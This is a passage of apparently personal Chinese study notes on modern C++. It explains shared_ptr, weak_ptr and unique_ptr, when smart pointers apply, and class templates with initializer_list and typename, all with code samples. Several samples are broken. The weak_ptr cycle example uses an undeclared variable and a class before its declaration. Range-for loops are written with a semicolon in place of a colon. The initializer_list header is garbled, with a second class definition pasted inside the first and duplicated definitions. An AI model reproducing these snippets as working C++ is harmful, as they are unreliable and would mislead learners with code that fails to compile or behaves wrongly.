 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; 	</span><br><span class="line">	std::shared_ptr&lt;<span class="type">int</span>&gt;sharedI = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>); 	</span><br><span class="line">    std::shared_ptr&lt;<span class="type">int</span>&gt;sharedI2 = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">1000</span>);</span><br><span class="line">	sharedI.<span class="built_in">swap</span>(sharedI2);<span class="comment">//std::swap(sharedI,sharedI2)</span></span><br><span class="line">	std::cout &lt;&lt; *sharedI &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; *sharedI2 &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/05/%E7%8E%B0%E4%BB%A3C++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-20%20165343-1679302470989-3.png"></p>
<p> 5.关于智能指针创建数组的问题。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">std::shared_ptr&lt;<span class="type">int</span>&gt; <span class="title">sharedI</span><span class="params">(<span class="keyword">new</span> <span class="type">int</span>[<span class="number">100</span>]())</span></span>;</span><br><span class="line">std::cout&lt;&lt;sharedI.<span class="built_in">get</span>()[<span class="number">10</span>]&lt;&lt;std::endl;<span class="comment">//不能像普通数组一样使用</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myFunc</span><span class="params">(std::shared_ptr&lt;<span class="type">int</span>&gt; sharedI)</span><span class="comment">//不用写const</span></span></span><br></pre></td></tr></table></figure>

<p>6.用智能指针作为参数传递时直接值传递就可以了。shared_ptr的大小为固定的8或16字节（也就是两倍指针的的大小，32位系统指针为4个字节，64位系统指针为8个字节，shared_ptr中就两个指针），所以直接值传递就可以了。</p>
<p> shared_ptr总结：在现代程序中，当想要共享一块堆内存时，优先使用shared_ptr，可以极大的减少内存泄露的问题。</p>
<h2 id="weak-ptr"><a href="#weak-ptr" class="headerlink" title="(*)weak_ptr"></a>(*)weak_ptr</h2><p><strong>1.</strong> <strong>weak_ptr介绍：</strong></p>
<p>(1) 这个智能指针是在C++11的时候引入的标准库，它的出现完全是为了弥补shared_ptr天生有缺陷的问题，其实shared_ptr可以说近乎完美。</p>
<p>(2) 只是通过引用计数实现的方式也引来了引用成环的问题，这种问题靠它自己是没办法解决的，所以在C++11的时候将shared_ptr和weak_ptr一起引入了标准库，用来解决循环引用的问题。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; 	</span><br><span class="line">	std::shared_ptr&lt;<span class="type">int</span>&gt;sharedI = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>);</span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">use_count</span>() &lt;&lt; std::endl;</span><br><span class="line">	std::weak_ptr&lt;<span class="type">int</span>&gt;<span class="built_in">weakI</span>(sharedI);<span class="comment">//weak_ptr指向同一个内存不增加引用计数</span></span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">use_count</span>() &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2.</strong> <strong>shared_ptr的循环引用问题：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	std::weak_ptr&lt;B&gt; weakB;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	std::shared_ptr&lt;A&gt; sharedA;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; 	</span><br><span class="line">	std::shared_ptr&lt;A&gt;sharedA = std::<span class="built_in">make_shared</span>&lt;A&gt;();</span><br><span class="line">	std::shared_ptr&lt;B&gt;shareB = std::<span class="built_in">make_shared</span>&lt;B&gt;();</span><br><span class="line">	sharedA-&gt;weakB = weakB;</span><br><span class="line">	weakB-&gt;sharedA = sharedA;<span class="comment">//如果为两个shared_ptr相互指引导致内存无法释放,所以将其中一个改为weak_ptr</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.</strong> <strong>weak_ptr的作用原理：</strong>weak_ptr的对象需要绑定到shared_ptr对象上，作用原理是weak_ptr不会改变shared_ptr对象的引用计数。只要shared_ptr对象的引用计数为0，就会释放内存，weak_ptr的对象不会影响释放内存的过程。</p>
<p>总结：<strong>weak_ptr使用较少，就是为了处理shared_ptr循环引用问题而设计的。</strong></p>
<h2 id="unique-ptr"><a href="#unique-ptr" class="headerlink" title="(*)unique_ptr"></a>(*)unique_ptr</h2><p><strong>1.</strong> <strong>uniqe_ptr介绍：</strong>独占式智能指针，在使用智能指针时，我们一般优先考虑独占式智能指针，因为消耗更小。如果发现内存需要共享，那么再去使用“shared_ptr”。</p>
<p><strong>2</strong> <strong>unique_ptr的初始化</strong>：和shared_ptr完全类似</p>
<p>(1) 使用new运算符进行初始化</p>
<p>(2) 使用make_unique函数进行初始化</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::unique_ptr&lt;<span class="type">int</span>&gt;<span class="built_in">uniqueI2</span>(<span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">100</span>));</span><br><span class="line">	std::unique_ptr&lt;<span class="type">int</span>&gt; uniqueI = std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.</strong> <strong>unique_ptr的常用操作</strong></p>
<p>(1) unque_ptr禁止复制构造函数，也禁止赋值运算符的重载。否则独占便毫无意义。</p>
<p>(2) unqiue_ptr允许移动构造，移动赋值。移动语义代表之前的对象已经失去了意义，移动操作自然不影响独占的特性。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::unique_ptr&lt;<span class="type">int</span>&gt; uniqueI = std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>);</span><br><span class="line">    std::unique_ptr&lt;<span class="type">int</span>&gt;uniqueI2=std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>&gt;(<span class="number">200</span>);</span><br><span class="line">    uniqueI2=std::<span class="built_in">move</span>(uniqueI);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(3) reset函数：</p>
<p>① 不带参数的情况下：释放智能指针的对象，并将智能指针置空。</p>
<p>② 带参数的情况下：释放智能指针的对象，并将智能指针指向新的对象。</p>
<p> <strong>和shared_ptr使用方法一样</strong></p>
<p><strong>4.</strong> <strong>将unque_ptr的对象转化为shared_ptr对象，</strong>当unique_ptr的对象为一个右值时，就可以将该对象转化为shared_ptr的对象。</p>
<p><strong>这个使用的并不多，需要将独占式指针转化为共享式指针常常是因为先前设计失误。</strong></p>
<p><strong>注意：shared_ptr对象无法转化为unique_ptr对象。</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myfunc</span><span class="params">(std::unique_ptr&lt;<span class="type">int</span>&gt; uniqueI)</span><span class="comment">//需要共享操作时</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::shared_ptr&lt;<span class="type">int</span>&gt;<span class="built_in">sharedI</span>(std::<span class="built_in">move</span>(uniqueI));<span class="comment">//转换</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::unique_ptr&lt;<span class="type">int</span>&gt; uniqueI = std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>);</span><br><span class="line">    std::unique_ptr&lt;<span class="type">int</span>&gt;uniqueI2=std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>&gt;(<span class="number">200</span>);</span><br><span class="line">    uniqueI2=std::<span class="built_in">move</span>(uniqueI);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="只能指针适用范围"><a href="#只能指针适用范围" class="headerlink" title="(**)只能指针适用范围"></a>(**)只能指针适用范围</h2><p><strong>1.</strong> <strong>能使用智能指针就尽量使用智能指针，那么哪些情况属于不能使用智能指针的情况  呢？</strong></p>
<p> 有些函数必须使用C语言的指针，这些函数又没有替代，这种情况下，才使用普通的指针，其它情况一律使用智能指针。</p>
<p> 必须使用C语言指针的情况包括：</p>
<p><strong>（1）</strong> <strong>网络传输函数</strong>，比如windows下的send，recv函数，只能使用c语言指针，无法替代.</p>
<p><strong>（2）</strong> <strong>c语言的文件操作部分</strong>。这方面C++已经有了替代品，C++的文件操作完全支持智能指针，<strong>所以在做大型项目时，推荐使用C++的文件操作功能。</strong></p>
<p><strong>除了以上两种情况，剩下的均推荐使用智能指针。</strong></p>
<p><strong>2.</strong> <strong>我们应该使用哪个智能指针呢？</strong></p>
<p><strong>(1)</strong> <strong>优先使用unique_ptr，内存需要共享时再使用shared_ptr。</strong></p>
<p><strong>当使用shared_ptr时，如果出现了循环引用的情况，再去考虑使用weak_ptr</strong></p>
<h1 id="模板与泛型编程"><a href="#模板与泛型编程" class="headerlink" title="模板与泛型编程"></a>模板与泛型编程</h1><h2 id="模板介绍，类模板与模板实现原理"><a href="#模板介绍，类模板与模板实现原理" class="headerlink" title="模板介绍，类模板与模板实现原理"></a>模板介绍，类模板与模板实现原理</h2><p><strong>1.</strong> <strong>模板的重要性：模板是C++最重要的模块之一，很多人对模板的重视不够，这一章一定要好好学，所有课时都是重点。</strong></p>
<p><strong>C++的三大模块，面向过程，面向对象，模板与泛型。面向过程就是C语言，面向对象就是类，现在轮到模板与泛型了。</strong></p>
<p><strong>2.</strong> <strong>模板的介绍：</strong></p>
<p>(1) 模板能够实现一些其他语法难以实现的功能，但是理解起来会更加困难，容易导致新手摸不着头脑。</p>
<p>(2) 模板分为类模板和函数模板，函数模板又分为普通函数模板和成员函数模板。</p>
<p> <strong>3.</strong> <strong>类模板基础：</strong></p>
<p>类模板的写法与使用十分固定</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">using</span> iterator = T*;<span class="comment">//定义新的类型</span></span><br><span class="line">	<span class="keyword">using</span> const_iterator = <span class="type">const</span> T*;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">MyArray</span>(<span class="type">size_t</span> count);</span><br><span class="line">	~<span class="built_in">MyArray</span>();</span><br><span class="line">	<span class="comment">//&#123; 写在类里面</span></span><br><span class="line">	<span class="comment">//	if (count)</span></span><br><span class="line">	<span class="comment">//	&#123;</span></span><br><span class="line">	<span class="comment">//		data = new T[count]();</span></span><br><span class="line">	<span class="comment">//	&#125;</span></span><br><span class="line">	<span class="comment">//	else</span></span><br><span class="line">	<span class="comment">//	&#123;</span></span><br><span class="line">	<span class="comment">//		data = nullptr;</span></span><br><span class="line">	<span class="comment">//	&#125;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//&#123;//类内定义</span></span><br><span class="line"><span class="comment">//	if (data)</span></span><br><span class="line"><span class="comment">//	&#123;</span></span><br><span class="line"><span class="comment">//		delete[] data;</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line">	<span class="function">iterator <span class="title">begin</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> data;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">const_iterator <span class="title">cbegin</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> data;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	T* data;<span class="comment">//在类中复杂情况可以用智能指针，在老版本不支持创建数组</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">//写在类外面，一般都在类外定义</span></span><br><span class="line">MyArray&lt;T&gt;::<span class="built_in">MyArray</span>(<span class="type">size_t</span> count)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (count)</span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="keyword">new</span> T[count]();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="literal">nullptr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">////类外定义需要先把模板头写上去</span></span><br><span class="line">MyArray&lt;T&gt;::~<span class="built_in">MyArray</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (data)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">delete</span>[] data;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">//begin的类外定义</span></span><br><span class="line"><span class="keyword">typename</span> MyArray&lt;T&gt;::iterator MyArray&lt;T&gt;::<span class="built_in">begin</span>() <span class="type">const</span><span class="comment">//::前面的名称一定是类名或者明明空间</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意，这段代码非常有代表性，在下一课补完后，一定要掌握，多看几遍。</strong></p>
<p><strong>4.</strong> <strong>模板的实现原理：</strong></p>
<p>模板需要编译两次，在第一次编译时仅仅检查最基本的语法，比如括号是否匹配。等函数真正被调用时，才会真正生成需要的类或函数。所以这直接导致了一个结果，就是不论是模板类还是模板函数，声明与实现都必须放在同一个文件中。因为在程序在编译期就必须知道函数的具体实现过程。如果实现和声明分文件编写，需要在链接时才可以看到函数的具体实现过程，这当然会报错。</p>
<p> 于是人们发明了.hpp文件来存放模板这种声明与实现在同一文件的情况。</p>
<h2 id="initializer-list与typename"><a href="#initializer-list与typename" class="headerlink" title="(*)initializer_list与typename"></a>(*)initializer_list与typename</h2><p>1.initializer_list的用法</p>
<p>(1) initializer_list介绍：initializer_list其实就是初始化列表，我们可以用初始化列表初始化各种容器，比如“vector”，“数组”。</p>
<p> 2.typename的用法</p>
<p>(1) 在定义模板时表示这个一个待定的类型</p>
<p>(2) 在类外表明自定义类型时使用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">#.hpp</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;type_traits&gt;</span><span class="comment">//萃取技术判断是否是指针</span></span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">//模板特化</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">get_type</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">using</span> type = T;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">get_type</span>&lt;T*&gt;</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">using</span> type = T;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">using</span> iterator = T*;<span class="comment">//定义新的类型</span></span><br><span class="line">	<span class="keyword">using</span> const_iterator = <span class="type">const</span> T*;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">MyArray</span>(<span class="type">size_t</span> count);</span><br><span class="line">	<span class="built_in">MyArray</span>(<span class="type">const</span> std::initializer_list&lt;T&gt;&amp; list);</span><br><span class="line">	<span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">using</span> iterator = T*;<span class="comment">//定义新的类型</span></span><br><span class="line">	<span class="keyword">using</span> const_iterator = <span class="type">const</span> T*;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">MyArray</span>(<span class="type">const</span> std::initializer_list&lt;T&gt;&amp; list);</span><br><span class="line">	<span class="built_in">MyArray</span>(std::initializer_list&lt;T&gt;&amp;&amp; list);</span><br><span class="line">	<span class="built_in">MyArray</span>(<span class="type">size_t</span> count);</span><br><span class="line">	~<span class="built_in">MyArray</span>();</span><br><span class="line"></span><br><span class="line">	<span class="function">iterator <span class="title">begin</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> data;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">const_iterator <span class="title">cbegin</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> data;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	T* data;<span class="comment">//在类中复杂情况可以用智能指针，在老版本不支持创建数组</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">//写在类外面，一般都在类外定义</span></span><br><span class="line">MyArray&lt;T&gt;::<span class="built_in">MyArray</span>(<span class="type">size_t</span> count)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (count)</span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="keyword">new</span> T[count]();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="literal">nullptr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">////类外定义需要先把模板头写上去</span></span><br><span class="line">MyArray&lt;T&gt;::~<span class="built_in">MyArray</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (data)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">delete</span>[] data;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">//begin的类外定义</span></span><br><span class="line"><span class="keyword">typename</span> MyArray&lt;T&gt;::iterator MyArray&lt;T&gt;::<span class="built_in">begin</span>() <span class="type">const</span><span class="comment">//::前面的名称一定是类名或者明明空间</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line">	~<span class="built_in">MyArray</span>();</span><br><span class="line">	<span class="function">iterator <span class="title">begin</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> data;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">const_iterator <span class="title">cbegin</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> data;</span><br><span class="line">	&#125;</span><br><span class="line">	T&amp; <span class="keyword">operator</span>[](<span class="type">unsigned</span> count)<span class="type">const</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> data[count];<span class="comment">//重载</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	std::vector&lt;T&gt; data;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">//写在类外面，一般都在类外定义</span></span><br><span class="line">MyArray&lt;T&gt;::<span class="built_in">MyArray</span>(<span class="type">size_t</span> count)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (count)</span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="keyword">new</span> T[count]();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="literal">nullptr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">////类外定义需要先把模板头写上去</span></span><br><span class="line">MyArray&lt;T&gt;::~<span class="built_in">MyArray</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (data)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">delete</span>[] data;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">MyArray&lt;T&gt;::<span class="built_in">MyArray</span>(<span class="type">const</span> std::initializer_list&lt;T&gt;&amp; list)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (list.<span class="built_in">size</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">unsigned</span> count = <span class="number">0</span>;</span><br><span class="line">		data = <span class="keyword">new</span> T[list.<span class="built_in">size</span>()]();</span><br><span class="line">		<span class="keyword">if</span> (std::is_pointer&lt;T&gt;::value)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">auto</span> elem : list)</span><br><span class="line">			&#123;</span><br><span class="line">				data[count++] = <span class="keyword">new</span> <span class="keyword">typename</span> get_type&lt;T&gt;::<span class="built_in">type</span>(*elem);<span class="comment">//相当于两层指针，在删除时，只删除第一层，会出现内存泄漏</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; elem; list)</span><br><span class="line">			&#123;</span><br><span class="line">				data[count++] = elem;<span class="comment">//存在bug，如果存放的是指针，很变成浅复制</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="literal">nullptr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">MyArray&lt;T&gt;::<span class="built_in">MyArray</span>(std::initializer_list&lt;T&gt;&amp;&amp; list)<span class="comment">//右值引用</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (list.<span class="built_in">size</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">unsigned</span> count = <span class="number">0</span>;</span><br><span class="line">		data = <span class="keyword">new</span> T[list.<span class="built_in">size</span>()]();</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; elem; list)</span><br><span class="line">		&#123;</span><br><span class="line">			data[count++] = elem;<span class="comment">//存在bug，如果存放的是指针，很变成浅复制</span></span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="literal">nullptr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">#.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;myArray.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//std::initializer_list&lt;int&gt; iList&#123; 1,2,3,4,5 &#125;;</span></span><br><span class="line">	<span class="comment">//std::vector&lt;int&gt; ivec(iList);//左值类型的初始化,右值类型初始化ivec&#123;1,2,3,4,5&#125;</span></span><br><span class="line">	<span class="type">int</span> i1 = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> i2 = <span class="number">20</span>;</span><br><span class="line">	<span class="type">int</span> i3 = <span class="number">30</span>;</span><br><span class="line">	<span class="type">int</span> i4 = <span class="number">40</span>;</span><br><span class="line">	std::initializer_list&lt;<span class="type">int</span>*&gt; iList&#123; &amp;i1,&amp;i2,&amp;i3,&amp;i4 &#125;;</span><br><span class="line">	<span class="function">MyArray&lt;<span class="type">int</span>*&gt; <span class="title">arrayPi</span><span class="params">(iList)</span></span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; arrayPi[i] &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p><strong>在C++的早期版本，为了减少关键字数量，用class来表示模板的参数，但是后来因为第二个原因，不得不引入typename关键字。</strong></p>
<h2 id="函数模板，成员函数模板"><a href="#函数模板，成员函数模板" class="headerlink" title="(*)函数模板，成员函数模板"></a>(*)函数模板，成员函数模板</h2><p>1.普通函数模板的写法与类模板类似</p>
